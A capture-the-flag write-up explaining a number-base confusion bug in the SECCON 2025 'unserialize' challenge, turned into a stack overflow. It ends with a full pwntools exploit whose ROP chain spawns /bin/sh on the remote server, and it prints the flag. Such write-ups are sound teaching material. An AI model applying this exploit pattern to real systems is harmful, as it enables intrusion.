---
date: '2025-12-17T09:00:00Z'
draft: false
title: 'Seccon Quals 2025 - unserialize'
summary: "Warmup challenge featuring a \"number conversion base confusion\"."

categories: ["Writeups"]
tags: [ "bof"]
author: "leo_something"
ShowToc: true
---

## Overview
The challenge consists in a simple c program that takes your input and "unserializes" it. 
```c
int main() {
  char buf[0x100];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  if (unserialize(stdin, buf, sizeof(buf)) < 0) {
    puts("[-] Deserialization faield");
  } else {
    puts("[+] Deserialization success");
  }
  
  return 0;
}
```

The `unserialize` function looks like this.
```c
ssize_t unserialize(FILE *fp, char *buf, size_t size) {
  char szbuf[0x20];
  char *tmpbuf;

  for (size_t i = 0; i < sizeof(szbuf); i++) {
    szbuf[i] = fgetc(fp);
    if (szbuf[i] == ':') {
      szbuf[i] = 0;
      break;
    }
    if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) {
      return -1;
    }
  }

  if (atoi(szbuf) > size) {
    return -1;
  }

  tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0));

  size_t sz = strtoul(szbuf, NULL, 10);
  for (size_t i = 0; i < sz; i++) {
    if (fscanf(fp, "%02hhx", tmpbuf + i) != 1) {
      return -1;
    }
  }

  memcpy(buf, tmpbuf, sz);
  return sz;
}
```
This reads the input string until a `:` and converts it to an `unsigned long` size.
Then it uses the size to allocate a buffer on the stack and finally lets us write arbitrary data into that buffer.

## Vulnerability
`unserialize` calls `strtoul(szbuf, NULL, 0)` to get the size for the buffer, but then it uses `strtoul(szbuf, NULL, 10)` to read the bytes inside it.

From the [man page of strtoul](https://linux.die.net/man/3/strtoul):
>[...] a zero _base_ is taken as 10 (decimal) unless the next character is '0', in which case it is taken as 8 (octal).

We can trigger a number base confusion (I just made up the name lmao) in `unserialize`, by giving a number that starts with `0`.
Another thing to notice in the man page is
>The remainder of the string is converted to an _unsigned long int_ value in the obvious manner, stopping at the first character which is not a valid digit in the given base.

So we can stop the conversion by giving an invalid octal number, for example `9`.
Our payload will look like this `0199:`
What will happen when `unserialize` is called is the following:
1. the part of the string before `:` is used
2. every character is a digit, so the check passes (this is why we can't input hexadecimal numbers, because they contain an `x` which is not a digit)
3. `atoi(szbuf)` is 199, so the check passes
4. now `strtoul` will decode our number as octal, returning `1`
5. `alloca(1)` will allocate 0x10 bytes to keep the stack aligned 
6. `strtoul` is called with base `10` so we can get a stack overflow of `199-16` bytes

**NOTE:** you could trick also `atoi` using `04294967296` (which is `0x100000000`) and get a huge overflow, but I just realized it.

## Exploitation
The binary has `No PIE` and is statically compiled.

We have a stack BOF, we need to bypass the canary somehow. To better understand the stack layout I opened up IDA and decompiled it.
```c
// the overflow starts here 
unsigned __int64 v4; // rax
void *tmpbuf; // rsp
int v6; // r8d
int v7; // r9d
char v8[8]; // [rsp+8h] [rbp-70h] BYREF
unsigned __int64 size; // [rsp+10h] [rbp-68h]
__int64 buf; // [rsp+18h] [rbp-60h]
__int64 fp; // [rsp+20h] [rbp-58h]
unsigned __int64 i; // [rsp+28h] [rbp-50h]
unsigned __int64 j; // [rsp+30h] [rbp-48h]
char *v14; // [rsp+38h] [rbp-40h]
unsigned __int64 v15; // [rsp+40h] [rbp-38h]
_BYTE szbuf[40]; // [rsp+48h] [rbp-30h] BYREF
unsigned __int64 canary; // [rsp+70h] [rbp-8h]
```

We can overflow until `j`, which is the index of the last for loop in `unserialize`. 
Then override `j` with `0x87`, this will trick the for loop into skipping some iterations and resume from the offset of the return address on the stack. Then we can just ROP.
**NOTE:** we need to restore `fp` and `buf` while we overflow.

### Final exploit
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe
context.terminal = ["alacritty", "-e"]

NC_CMD = "nc unserialize.seccon.games 5000"
gdbscript = \
"""
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript=gdbscript, aslr=True)
    else:
        r = remote(NC_CMD.split(" ")[1], int(NC_CMD.split(" ")[2]))

    return r

def main():
    r = conn()

    payload = b"0199:"
    # payload = b"04294967296:"
    r.send(payload)

    sleep(0.1)

    POP_RSI = 0x000000000043617e
    POP_RAX = 0x00000000004303ab
    SYSCALL = 0x0000000000415d36
    rop_chain = flat(POP_RSI, 0, POP_RAX, 0x3b, SYSCALL)

    payload = b"/bin/sh\0" + b"A"*0x18 + flat(0x4CA760, 0x4ca440) + b"B"*8 + p8(0x87)
    payload += rop_chain

    payload = payload.ljust(0x200, b"\0")
    for i in range(len(payload)):
        r.sendline(payload[i].to_bytes().hex().encode())

    r.interactive()

if __name__ == "__main__":
    main()
```
**FLAG:** `SECCON{ev3rY_5tR1ng_c0nV3rs10n_wOrKs_1n_a_d1fFeR3n7_w4y}`
